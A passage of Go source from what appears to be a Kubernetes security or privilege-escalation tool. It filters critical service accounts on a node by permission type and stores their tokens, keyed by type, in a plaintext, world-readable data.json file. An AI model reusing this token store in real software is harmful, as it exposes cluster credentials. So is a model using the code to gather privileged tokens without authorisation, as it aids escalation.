				if strings.Contains(strings.ToUpper(criticalType), strings.ToUpper(pt)) && criticalSA.InNode == true {
					flag = true
					tmpcriticalSA := models.CriticalSAWrapper{
						Type:  criticalType,
						Crisa: criticalSA,
					}
					result = append(result, filter{Level: criticalSA.Level, SA: tmpcriticalSA})
					break
				}
			}
		}
	}
	sort.Slice(result, func(i, j int) bool {
		return result[i].Level < result[j].Level
	})
	return flag, result
}

// Specify name-type-token when writing; only need to specify the desired permissionType when reading
func PersistToken(operator string, saName string, permissionType string, token string) interface{} {
	fileName := "data.json"
	fields := make([]map[string]interface{}, 0)
	data, _ := ioutil.ReadFile(fileName)
	err := json.Unmarshal(data, &fields)
	if err != nil {
		log.Fatal(err)
	}

	if operator == "write" {
		token := &models.SAtoken{
			SaName:         saName,
			PermissionType: permissionType,
			Token:          token,
		}
		tp := reflect.TypeOf(token).Elem()
		vp := reflect.ValueOf(token).Elem()
		field := make(map[string]interface{}, 0)
		for i := 0; i < tp.NumField(); i++ {
			field1 := tp.Field(i)
			field2 := vp.Field(i)
			key := field1.Tag.Get("json")
			field[key] = field2.Interface()
		}
		fields = append(fields, field)
		out, _ := json.Marshal(fields)
		_ = ioutil.WriteFile(fileName, out, 0755)
		return ""
	}
	if operator == "read" {
		//fmt.Print(fields)
		for _, token := range fields {
			if token["type"] == permissionType {
				return token["token"]
			}
		}
		return ""
	}
	return ""
}
